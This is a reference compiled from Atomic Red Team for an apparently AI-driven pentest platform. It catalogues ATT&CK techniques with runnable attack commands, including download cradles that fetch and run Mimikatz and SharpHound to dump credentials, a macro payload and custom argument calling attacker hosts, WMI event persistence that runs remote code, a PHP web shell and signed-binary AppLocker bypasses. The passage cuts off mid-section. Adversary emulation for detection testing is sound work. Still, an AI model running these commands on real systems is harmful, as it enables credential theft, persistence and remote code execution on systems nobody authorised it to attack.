# Atomic Red Team - ATHENA Pentest Platform Reference

Source: Atomic Red Team (MIT License) — github.com/redcanaryco/atomic-red-team

**Date:** 2026-02-26
**Version:** Atomic Red Team master branch (January 2026 snapshot, 11,500+ stars, 3,100+ forks)
**Purpose:** Offensive pentest reference for ATHENA AI Pentest Platform (ZeroK Labs)
**License:** MIT — fully cleared for commercial use in ATHENA

---

## Table of Contents

1. [YAML Schema Reference](#yaml-schema-reference)
2. [Invoke-AtomicRedTeam PowerShell Module](#invoke-atomicredteam-powershell-module)
3. [TA0001 — Initial Access](#ta0001--initial-access-top-10)
4. [TA0002 — Execution](#ta0002--execution-top-15)
5. [TA0003 — Persistence](#ta0003--persistence-top-15)
6. [TA0004 — Privilege Escalation](#ta0004--privilege-escalation-top-10)
7. [TA0005 — Defense Evasion](#ta0005--defense-evasion-top-15)
8. [TA0006 — Credential Access](#ta0006--credential-access-top-15)
9. [TA0007 — Discovery](#ta0007--discovery-top-10)
10. [TA0008 — Lateral Movement](#ta0008--lateral-movement-top-10)
11. [TA0009 — Collection](#ta0009--collection-top-5)
12. [TA0010 — Exfiltration](#ta0010--exfiltration-top-5)
13. [TA0011 — Command and Control](#ta0011--command-and-control-top-10)
14. [ATHENA Integration Notes](#athena-integration-notes)
15. [Post-Exploitation Validation Workflow](#post-exploitation-validation-workflow)

---

## YAML Schema Reference

Every atomic test lives at:

```
atomics/
  T{technique_id}/
    T{technique_id}.yaml    # All tests for this technique (machine-parseable)
    T{technique_id}.md      # Human-readable markdown (auto-generated)
    src/                    # Source files, payloads
    bin/                    # Binary dependencies
```

### Full YAML Structure

```yaml
attack_technique: T1059.001            # ATT&CK technique ID (capital T)
display_name: 'Command and Scripting Interpreter: PowerShell'

atomic_tests:
  - name: Mimikatz                      # Human-readable test name
    auto_generated_guid: f3132740-55bc-48c4-bcc0-758a459cd027  # UUID, unique per test
    description: |
      Download Mimikatz and dump credentials. Upon execution, mimikatz dump
      details and password hashes will be displayed.
    supported_platforms:
      - windows                         # windows | linux | macos
    input_arguments:
      mimurl:
        description: Mimikatz url
        type: url                       # string | url | path | integer | float | boolean
        default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Invoke-Mimikatz.ps1
    dependency_executor_name: powershell  # Executor for prereq checks
    dependencies:
      - description: |
          SharpHound.ps1 must be located at "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
        prereq_command: |
          if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1") {exit 0} else {exit 1}
        get_prereq_command: |
          New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
          Invoke-WebRequest "https://..." -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    executor:
      name: command_prompt              # command_prompt | powershell | sh | bash | manual
      elevation_required: true          # Requires admin/root
      command: |
        powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
      cleanup_command: |
        Remove-Item $env:Temp\*BloodHound.zip -Force
```

### Key Schema Fields

| Field | Description | Notes |
|-------|-------------|-------|
| `attack_technique` | ATT&CK technique ID | Always capital T, e.g. T1059.001 |
| `display_name` | Technique full name | Matches ATT&CK matrix |
| `auto_generated_guid` | UUID per test | Use as stable identifier in ATHENA |
| `supported_platforms` | OS list | windows, linux, macos |
| `input_arguments` | Parameterizable values | `#{argname}` substitution |
| `executor.name` | How test runs | command_prompt, powershell, sh, bash, manual |
| `executor.elevation_required` | Needs admin | boolean |
| `executor.command` | The attack command | `#{param}` for variable substitution |
| `executor.cleanup_command` | Cleanup procedure | Run after test to restore state |
| `dependencies` | Prerequisites | Check/install dependencies before running |
| `prereq_command` | Check dependency | Exit 0 = met, exit 1 = not met |
| `get_prereq_command` | Install dependency | Download/install missing dependencies |

### Executor Types

| Executor | Shell Used | Platform |
|----------|-----------|---------|
| `command_prompt` | cmd.exe | Windows |
| `powershell` | powershell.exe | Windows |
| `sh` | /bin/sh | Linux, macOS |
| `bash` | /bin/bash | Linux, macOS |
| `manual` | Human steps | Any — cannot be automated |

### Variable Substitution

All atomic commands use `#{variable_name}` for parameterization. ATHENA should:

1. Parse `input_arguments` from YAML
2. Use `default` values unless overridden by operator
3. Substitute `#{argname}` in `command` and `cleanup_command` before execution
4. Special built-in: `PathToAtomicsFolder` = local path to atomics directory

---

## Invoke-AtomicRedTeam PowerShell Module

Repository: `github.com/redcanaryco/invoke-atomicredteam`
License: MIT
Authors: Casey Smith (@subTee), Josh Rickard (@MS_dministrator), Carrie Roberts (@OrOneEqualsOne), Matt Graeber (@mattifestation)

### Installation

```powershell
# Install from PowerShell Gallery
Install-Module -Name Invoke-AtomicRedTeam -Scope CurrentUser

# Or use download cradle
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics

# Required dependency
Install-Module -Name powershell-yaml -Scope CurrentUser
Import-Module Invoke-AtomicRedTeam
```

### Core Commands

```powershell
# List all tests for a technique (brief)
Invoke-AtomicTest T1059.001 -ShowDetailsBrief

# List full details for all tests
Invoke-AtomicTest T1059.001 -ShowDetails

# Check if prerequisites are met
Invoke-AtomicTest T1059.001 -CheckPrereqs

# Install/fetch prerequisites
Invoke-AtomicTest T1059.001 -GetPrereqs

# Execute ALL tests for a technique
Invoke-AtomicTest T1059.001

# Execute specific test numbers
Invoke-AtomicTest T1059.001 -TestNumbers 1,3,5

# Execute by test name
Invoke-AtomicTest T1059.001 -TestNames "Mimikatz"

# Execute by GUID (most stable selector)
Invoke-AtomicTest T1059.001 -TestGuids "f3132740-55bc-48c4-bcc0-758a459cd027"

# Run cleanup after test
Invoke-AtomicTest T1059.001 -TestNumbers 1 -Cleanup

# Run cleanup with interactive prompt for args
Invoke-AtomicTest T1059.001 -PromptForInputArgs

# Run with custom arguments
Invoke-AtomicTest T1059.001 -InputArgs @{mimurl="https://attacker.com/Invoke-Mimikatz.ps1"}

# Run against remote computer (requires admin + WinRM)
Invoke-AtomicTest T1059.001 -Session $psSession

# Interactive output (useful for debugging)
Invoke-AtomicTest T1059.001 -Interactive

# Keep stdout/stderr files for post-processing
Invoke-AtomicTest T1059.001 -KeepStdOutStdErrFiles

# Run using GUID parameter (most deterministic)
Invoke-AtomicTest T1059.001 -TestGuids "f3132740-55bc-48c4-bcc0-758a459cd027"
```

### Module Functions

```powershell
# Full function list from Invoke-AtomicRedTeam.psd1:
Invoke-AtomicTest          # Core test execution
Get-AtomicTechnique        # Retrieve/validate YAML technique objects
New-AtomicTechnique        # Create new technique object
New-AtomicTest             # Create new test object
New-AtomicTestInputArgument  # Create input argument object
New-AtomicTestDependency   # Create dependency object
Start-AtomicGUI            # Launch web GUI (default port 8487)
Stop-AtomicGUI             # Stop web GUI
Invoke-SetupAtomicRunner   # Configure Atomic Runner (continuous testing)
Invoke-GenerateNewSchedule # Generate new test schedule CSV
Invoke-RefreshExistingSchedule # Update existing schedule
Invoke-AtomicRunner        # Run tests from schedule (unattended)
Get-Schedule               # View current schedule
Invoke-KickoffAtomicRunner # Start scheduled test run
Get-PreferredIPAddress     # Utility function
```

### Programmatic Parsing (ATHENA Integration)

```powershell
# Parse YAML directly using Get-AtomicTechnique
$technique = Get-AtomicTechnique -Path "C:\atomic-red-team\atomics\T1059.001\T1059.001.yaml"

# Iterate all techniques
Get-ChildItem -Path "C:\atomic-red-team\atomics\*" -Recurse -Include "T*.yaml" | Get-AtomicTechnique

# Access test properties programmatically
$technique.AtomicTests | ForEach-Object {
    Write-Host "Test: $($_.Name)"
    Write-Host "GUID: $($_.AutoGeneratedGuid)"
    Write-Host "Platforms: $($_.SupportedPlatforms -join ',')"
    Write-Host "Executor: $($_.Executor.Name)"
    Write-Host "Command: $($_.Executor.Command)"
    Write-Host "Cleanup: $($_.Executor.CleanupCommand)"
}
```

### Execution Logging

```powershell
# Log to Windows Event Log
$logger = New-AtomicTestExecutionLogger -LoggingModule "WinEvent-ExecutionLogger"
Invoke-AtomicTest T1059.001 -ExecutionLogPath "C:\logs\atomic-results.json" -Logger $logger

# Log in Attire format (structured JSON for SIEM integration)
$logger = New-AtomicTestExecutionLogger -LoggingModule "Attire-ExecutionLogger"

# Syslog output
$logger = New-AtomicTestExecutionLogger -LoggingModule "Syslog-ExecutionLogger"
```

---

## TA0001 — Initial Access (Top 10)

*Techniques for gaining initial foothold in target environment.*

---

### 1. T1566.001 — Spearphishing Attachment

**Platform:** Windows | **Executor:** manual / powershell

**Test: Spearphishing Macro**

```
Description: This test simulates opening a phishing attachment with a Word macro.
The macro executes a PowerShell payload.

Attack Commands (manual execution):
  1. Create Word document with macro:
     - Open Word
     - Insert VBA macro: Shell("cmd.exe /c powershell -w hidden -c IEX(IWR 'http://attacker/payload.ps1')")
     - Save as .docm
  2. Send to target via email
  3. Target opens and enables macros

Cleanup: Remove created documents
```

**Test: Spearphishing Attachment - Execute Macro**

```cmd
# Test macro execution via PowerShell simulation
powershell -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c echo Macro executed > %TEMP%\macro_test.txt'"

Cleanup:
Remove-Item %TEMP%\macro_test.txt -Force
```

---

### 2. T1566.002 — Spearphishing Link

**Platform:** Windows | **Executor:** powershell

**Test: Download and Execute via Spearphishing Link (Browser Drive-By)**

```powershell
# Simulate browser-delivered payload via crafted URL click
$url = "http://#{malicious_url}/payload.exe"
$dest = "$env:TEMP\spearphish_payload.exe"
(New-Object Net.WebClient).DownloadFile($url, $dest)
Start-Process $dest

Cleanup:
Remove-Item $dest -Force -ErrorAction Ignore
```

---

### 3. T1078.001 — Valid Accounts: Default Accounts

**Platform:** Windows | **Executor:** command_prompt

**Test: Enable Guest Account and Set Password**

```cmd
net user Guest /active:yes
net user Guest Password123!

Cleanup:
net user Guest /active:no
```

**Test: Abuse Default Domain Admin**

```cmd
# Enumerate default admin accounts
net user administrator
net localgroup administrators

Cleanup: (no state change)
```

---

### 4. T1190 — Exploit Public-Facing Application

**Platform:** Windows, Linux | **Executor:** sh / command_prompt

**Test: BlueKeep CVE-2019-0708 Check (WinPwn)**

```powershell
# WinPwn module: bluekeep scan
powershell -command "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')" ; bluekeep

Cleanup:
Remove-Item -Path "$env:TEMP\WinPwn*" -Recurse -Force -ErrorAction Ignore
```

---

### 5. T1133 — External Remote Services

**Platform:** Windows | **Executor:** powershell

**Test: Enumerate VPN/RDP/Citrix External Services**

```powershell
# Test external RDP access
$Server = "#{target_server}"
cmdkey /generic:TERMSRV/$Server /user:#{domain}\#{username} /pass:#{password}
mstsc /v:$Server

Cleanup:
$p = Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
```

---

### 6. T1195.002 — Compromise Software Supply Chain

**Platform:** Windows, Linux | **Executor:** sh

**Test: Malicious Package Install (npm)**

```bash
# Simulate supply chain compromise via trojanized npm package
npm install #{malicious_package}

Cleanup:
npm uninstall #{malicious_package}
```

---

### 7. T1091 — Replication Through Removable Media

**Platform:** Windows | **Executor:** powershell

**Test: USB Payload Drop via AutoRun**

```powershell
# Simulate removable media autorun payload
New-Item -Path "#{usb_drive}:\autorun.inf" -Value "[AutoRun]`nOpen=payload.exe"
Copy-Item "#{payload_path}" "#{usb_drive}:\payload.exe"

Cleanup:
Remove-Item "#{usb_drive}:\autorun.inf" -Force -ErrorAction Ignore
Remove-Item "#{usb_drive}:\payload.exe" -Force -ErrorAction Ignore
```

---

### 8. T1200 — Hardware Additions

**Platform:** Windows | **Executor:** manual

**Test: Rogue USB HID Device Simulation**

```
Description: Simulate insertion of a malicious USB HID device (e.g., Rubber Ducky).
Manual test — requires physical HID device or USB attack platform.

Procedure:
  1. Insert HID device
  2. HID types pre-programmed keystrokes
  3. Payload delivered via keyboard injection

Detection artifacts:
  - New USB device in Event Log (EventID 2003)
  - Rapid keystroke events
  - Unexpected process spawns from explorer.exe
```

---

### 9. T1189 — Drive-by Compromise

**Platform:** Windows | **Executor:** powershell

**Test: Malicious Browser Exploit via Iframe**

```powershell
# Simulate drive-by download behavior
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/96.0.4664.45")
$wc.DownloadString("http://#{c2_server}/exploit_payload.js")

# Check for downloaded payload
if (Test-Path "$env:TEMP\drive_by_payload.exe") { Start-Process "$env:TEMP\drive_by_payload.exe" }

Cleanup:
Remove-Item "$env:TEMP\drive_by_payload.exe" -Force -ErrorAction Ignore
```

---

### 10. T1199 — Trusted Relationship

**Platform:** Windows | **Executor:** powershell

**Test: Abuse MSP/Third-Party Admin Tool for Access**

```powershell
# Simulate abuse of trusted remote admin tool (e.g., ConnectWise, TeamViewer)
# Enumerate running remote admin services
Get-Service | Where-Object {$_.DisplayName -match "TeamViewer|ConnectWise|ScreenConnect|Kaseya|N-central"}
Get-Process | Where-Object {$_.Name -match "teamviewer|screenconnect|kaseya"}

Cleanup: (no state change — enumeration only)
```

---

## TA0002 — Execution (Top 15)

*Techniques adversaries use to run malicious code.*

---

### 1. T1059.001 — PowerShell

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Mimikatz via PowerShell Download Cradle (GUID: f3132740)**

```cmd
# Elevation required
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
# Default mimurl: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Invoke-Mimikatz.ps1
```

**Test #2: BloodHound from Memory (GUID: bf8c1441)**

```powershell
write-host "Remote download of SharpHound.ps1 into memory, followed by execution" -ForegroundColor Cyan
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1')
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5

Cleanup:
Remove-Item $env:Temp\*BloodHound.zip -Force
```

**Test #10: PowerShell Fileless Execution via Registry (GUID: fa050f5e)**

```cmd
# Store encoded payload in registry, execute from memory
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
powershell iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))

Cleanup:
Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
```

**Test #18: Invoke Known Malicious Cmdlets (GUID: 49eb9404)**

```powershell
# Tests detection of known malicious PowerShell cmdlets
$malCmdlets = @("Invoke-Mimikatz", "Invoke-BloodHound", "Invoke-Kerberoast",
                "Invoke-TokenManipulation", "Get-GPPPassword", "Invoke-CredentialInjection",
                "Invoke-NinjaCopy", "Get-Keystrokes", "Invoke-DllInjection",
                "Invoke-ReflectivePEInjection", "Invoke-ShellCode")
foreach ($cmdlet in $malCmdlets) { Write-Host "Testing cmdlet: $cmdlet" }
```

---

### 2. T1059.003 — Windows Command Shell

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Create and Execute Batch Script (GUID: 9e8894c0)**

```powershell
# Create batch file and execute
New-Item "PathToAtomicsFolder\..\ExternalPayloads\T1059.003_script.bat" -Force | Out-Null
Set-Content -Path "PathToAtomicsFolder\..\ExternalPayloads\T1059.003_script.bat" -Value "dir"
Start-Process "PathToAtomicsFolder\..\ExternalPayloads\T1059.003_script.bat"

Cleanup:
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\T1059.003_script.bat" -Force -ErrorAction Ignore
```

**Test #6: DarkGate Malware Simulation — VBS via CMD (GUID: 00682c9f)**

```cmd
c:\windows\system32\cmd.exe /c cd /d %TEMP%\ & echo Set objShell = CreateObject("WScript.Shell"):Set objExec = objShell.Exec("whoami"):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs

Cleanup:
del "AtomicTest.vbs" >nul 2>&1
```

---

### 3. T1047 — Windows Management Instrumentation

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: WMI Execute Process (GUID: 01f4d32f)**

```cmd
# Remote process execution via WMI — classic lateral movement enabler
wmic /node:"#{node}" process call create "#{process_to_execute}"
# Default node: 127.0.0.1
# Default process: C:\Windows\System32\calc.exe

Cleanup:
wmic /node:"#{node}" process where name='#{process_to_execute}' call terminate >nul 2>&1
```

**Test #2: WMI Execute Remote Process via PowerShell (GUID: 9c8db8bd)**

```powershell
$wmiParams = @{
  ComputerName = "#{node}"
  Class = "Win32_Process"
  Name = "Create"
  ArgumentList = "#{process_to_execute}"
}
Invoke-WmiMethod @wmiParams

Cleanup:
$wmiProcesses = Get-WMIObject Win32_Process -Filter "name='#{process_to_execute}'"
$wmiProcesses | Remove-WmiObject
```

---

### 4. T1053.005 — Scheduled Task

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Scheduled Task Startup Script (GUID: f7f31777)**

```cmd
# Create scheduled task that runs on system startup
schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"

Cleanup:
schtasks /delete /tn "T1053_005_OnStartup" /f > nul 2>&1
```

**Test #2: Scheduled Task via PowerShell (GUID: 2e5e81b3)**

```powershell
# Create scheduled task via PowerShell CIM
$Action = New-ScheduledTaskAction -Execute "#{task_command}" -Argument "#{task_args}"
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Settings = New-ScheduledTaskSettingsSet
$RunAs = "#{task_username}"
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings
Register-ScheduledTask -TaskName "#{task_name}" -InputObject $Task -User $RunAs

Cleanup:
Unregister-ScheduledTask -TaskName "#{task_name}" -Confirm:$false
```

---

### 5. T1569.002 — System Services: Service Execution

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Execute Payload via Service (GUID: 2382c42c)**

```cmd
# Create and start a Windows service to execute payload
sc create #{service_name} binpath= "#{execution_command}"
sc start #{service_name}
sc query #{service_name}

Cleanup:
sc stop #{service_name}
sc delete #{service_name}
```

---

### 6. T1059.005 — Visual Basic

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Execute VBScript from Command Prompt (GUID: 1b7b3d60)**

```cmd
# Execute VBScript payload
cscript.exe /E:vbscript #{script_path}

Cleanup:
Remove-Item #{script_path} -Force -ErrorAction Ignore
```

---

### 7. T1106 — Native API

**Platform:** Windows | **Executor:** powershell

**Test #1: Execute Shellcode via CreateThread (GUID: b95ece54)**

```powershell
# Executes shellcode via CreateThread Windows API
[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
# (shellcode injection pattern — full implementation in atomic)
```

---

### 8. T1218.005 — Signed Binary Proxy: Mshta

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Mshta executes JavaScript Scheme Fetch (GUID: b96b2fab)**

```cmd
mshta.exe javascript:a=(GetObject('script:#{script_url}')).Exec();close();

Cleanup: (no persistent state)
```

**Test #2: Mshta executes VBScript command (GUID: 1483fab9)**

```cmd
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""#{command_to_execute}"":close")

Cleanup: (no persistent state)
```

**Test #3: Mshta Executes Remote HTA (GUID: c4b97eeb)**

```cmd
mshta.exe http[:]//#{server_ip}/#{hta_file}
```

---

### 9. T1218.010 — Signed Binary Proxy: Regsvr32

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Regsvr32 local COM scriptlet execution — "Squiblydoo" (GUID: 449aa403)**

```cmd
# Execute remote COM scriptlet via regsvr32 (AppLocker bypass)
regsvr32.exe /s /u /i:#{filename} scrobj.dll
# Default filename: PathToAtomicsFolder\T1218.010\src\RegSvr32.sct
# Launches calc.exe as proof of execution

Cleanup: (no persistent state)
```

**Test #2: Regsvr32 remote COM scriptlet execution (GUID: c9d0f4ef)**

```cmd
regsvr32.exe /s /u /i:#{url} scrobj.dll
# Default url: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct
```

---

### 10. T1218.011 — Signed Binary Proxy: Rundll32

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Rundll32 execute JavaScript (GUID: cf3bdb9e)**

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{script_url}")

Cleanup: (no persistent state)
```

**Test #2: Rundll32 execute via ShellExecuteA (GUID: 3f5b5f6a)**

```cmd
rundll32 shell32.dll,ShellExec_RunDLL #{input_url}
```

---

### 11. T1127.001 — Trusted Developer Utility: MSBuild

**Platform:** Windows | **Executor:** command_prompt

**Test #1: MSBuild Bypass Using Inline Tasks C# (GUID: 58742c0f)**

```cmd
# Execute C# code via MSBuild to bypass AppLocker
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe "PathToAtomicsFolder\T1127.001\src\T1127.001.csproj"

Cleanup:
Remove-Item "C:\Windows\Temp\T1127001.txt" -Force -ErrorAction Ignore
```

---

### 12. T1204.002 — User Execution: Malicious File

**Platform:** Windows | **Executor:** powershell

**Test #1: OLE Payload on Disk (GUID: cac3c11f)**

```powershell
# Simulate malicious Office attachment execution
$fileName = "#{document_extension}"
$payload = "PathToAtomicsFolder\T1204.002\bin\T1204.002.$fileName"
Invoke-Expression $payload

Cleanup:
Remove-Item $payload -Force -ErrorAction Ignore
```

---

### 13. T1059.007 — JavaScript

**Platform:** Windows, macOS | **Executor:** command_prompt

**Test #1: Execute JavaScript via Wscript (GUID: 23772f14)**

```cmd
wscript.exe /E:jscript #{script_path}
# Executes JavaScript payload via Windows Script Host

Cleanup:
Remove-Item #{script_path} -Force -ErrorAction Ignore
```

---

### 14. T1559.002 — Dynamic Data Exchange

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Execute DDE Commands from Word (GUID: 6685a59c)**

```powershell
# DDE payload in Excel/Word formula
# Formula: =cmd|'/c calc.exe'!A1
# Creates malicious Office document with DDE field
$doc = New-Object -ComObject Word.Application
$doc.Visible = $false
$document = $doc.Documents.Add()
$range = $document.Range()
$range.InsertAfter("=cmd|'/c calc.exe'!A1")
$document.SaveAs2("$env:TEMP\dde_test.docx")
$doc.Quit()

Cleanup:
Remove-Item "$env:TEMP\dde_test.docx" -Force -ErrorAction Ignore
```

---

### 15. T1220 — XSL Script Processing

**Platform:** Windows | **Executor:** command_prompt

**Test #1: MSXSL Bypass using local files (GUID: ca23bfb2)**

```cmd
# Execute JScript/VBScript embedded in XSL via msxsl.exe or wmic
wmic os get /FORMAT:"#{xsl_path}"
# XSL file contains embedded JScript payload
# Default xsl_path: PathToAtomicsFolder\T1220\src\msxsltest.xsl

Cleanup: (no persistent state)
```

---

## TA0003 — Persistence (Top 15)

*Techniques for maintaining foothold after reboot or credential change.*

---

### 1. T1547.001 — Registry Run Keys / Startup Folder

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Add Boot Autostart Program via Registry (GUID: e55be3fd)**

```cmd
# HKCU Run key — no admin required
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Atomic Red Team" /t REG_SZ /d "#{command_to_execute}" /f

Cleanup:
reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Atomic Red Team" /f >nul 2>&1
```

**Test #2: Add Boot Autostart Program via HKLM (GUID: 554cbd88)**

```cmd
# HKLM Run key — requires admin
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Atomic Red Team" /t REG_SZ /d "#{command_to_execute}" /f

Cleanup:
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Atomic Red Team" /f >nul 2>&1
```

**Test #4: Add Persistence via Startup Folder (GUID: 2d9a9d1e)**

```powershell
# Drop payload in user startup folder
Copy-Item "#{payload_path}" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\#{payload_name}.lnk"

Cleanup:
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\#{payload_name}.lnk" -Force -ErrorAction Ignore
```

---

### 2. T1053.005 — Scheduled Task (Persistence)

**Platform:** Windows | **Executor:** command_prompt

**Test #1: OnLogon Scheduled Task (GUID: d2e5f11b)**

```cmd
schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"

Cleanup:
schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1
```

**Test #4: Persistence via COM Handler Hijack via Scheduled Task (GUID: 555a8b44)**

```cmd
schtasks /create /tn "#{task_name}" /sc daily /tr "#{task_command}" /ru SYSTEM /f

Cleanup:
schtasks /delete /tn "#{task_name}" /f
```

---

### 3. T1546.003 — WMI Event Subscription (Stealthy Persistence)

**Platform:** Windows | **Executor:** powershell

**Test #1: Persistence via WMI Event Subscription (GUID: 68813028)**

```powershell
# Create WMI event filter, consumer, and binding — triggers on __InstanceCreationEvent
$EventFilter = @{
  Name = "AtomicFilter"
  EventNameSpace = "root\cimv2"
  QueryLanguage = "WQL"
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-WMIInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilter

$CommandTemplate = 'powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(''#{payload_uri}'')"'
$ConsumerArgs = @{
  Name = "AtomicConsumer"
  CommandLineTemplate = $CommandTemplate
}
$Consumer = Set-WMIInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$FilterToConsumer = @{
  Filter = $Filter
  Consumer = $Consumer
}
Set-WMIInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumer

Cleanup:
Get-WMIObject -Namespace root\subscription -Class __EventFilter -Filter "Name='AtomicFilter'" | Remove-WmiObject
Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='AtomicConsumer'" | Remove-WmiObject
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
```

---

### 4. T1543.003 — Create/Modify System Process: Windows Service

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Modify Service to Run Malicious Executable (GUID: f56a6085)**

```cmd
sc config #{service_name} binPath= "#{path_to_malicious_binary}"
sc stop #{service_name}
sc start #{service_name}

Cleanup:
sc config #{service_name} binPath= "#{original_service_path}"
sc stop #{service_name}
sc start #{service_name}
```

---

### 5. T1574.001 — Hijack Execution Flow: DLL Search Order Hijacking

**Platform:** Windows | **Executor:** command_prompt

**Test #1: DLL Search Order Hijacking — Python (GUID: 8a6867e0)**

```cmd
# Place malicious DLL in app directory to intercept load
copy PathToAtomicsFolder\T1574.001\bin\#{dll_file} %TEMP%\#{dll_file}
cd %TEMP%
rundll32.exe #{dll_file},DllMain

Cleanup:
del %TEMP%\#{dll_file} /q
```

---

### 6. T1574.008 — Path Interception: Hijacking

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Path Interception via PATH environment variable (GUID: 3b04bfad)**

```powershell
# Copy payload to location earlier in PATH than legitimate binary
$newPath = "#{parent_folder}"
$itemsInNewPath = Get-ChildItem -Path $newPath
if ($itemsInNewPath.Name -notcontains "cmd.exe") {
  Copy-Item C:\Windows\System32\cmd.exe "$newPath\cmd.exe"
}
$env:Path = $newPath + ";" + $env:Path

Cleanup:
Remove-Item "$newPath\cmd.exe" -Force -ErrorAction Ignore
```

---

### 7. T1546.001 — Change Default File Association

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Application Hijack via File Association (GUID: 10a08978)**

```cmd
# Change .txt file association to malicious handler
assoc .#{extension}=AtomicRedTeam
ftype AtomicRedTeam=#{command}

Cleanup:
assoc .#{extension}=txtfile 2>&1 | Out-Null
ftype AtomicRedTeam= 2>&1 | Out-Null
```

---

### 8. T1505.003 — Server Software Component: Web Shell

**Platform:** Windows, Linux | **Executor:** powershell / sh

**Test #1: Web Shell via PHP (GUID: 8caa1dfe)**

```powershell
# Deploy PHP web shell to IIS/Apache
New-Item -Path "#{web_shell_path}" -ItemType File -Value "<?php system($_GET['cmd']); ?>"

Cleanup:
Remove-Item "#{web_shell_path}" -Force -ErrorAction Ignore
```

---

### 9. T1037.001 — Boot or Logon Initialization Scripts: Logon Script (Windows)

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Logon Script via UserInitMprLogonScript Registry (GUID: 3fc15f62)**

```cmd
reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "#{script_path}" /f

Cleanup:
reg delete "HKCU\Environment" /v UserInitMprLogonScript /f >nul 2>&1
```

---

### 10. T1547.004 — Winlogon Helper DLL

**Platform:** Windows | **Executor:** powershell

**Test #1: Winlogon Shell Key Persistence (GUID: 7b5b0124)**

```powershell
# Modify Winlogon Shell key to load malicious DLL
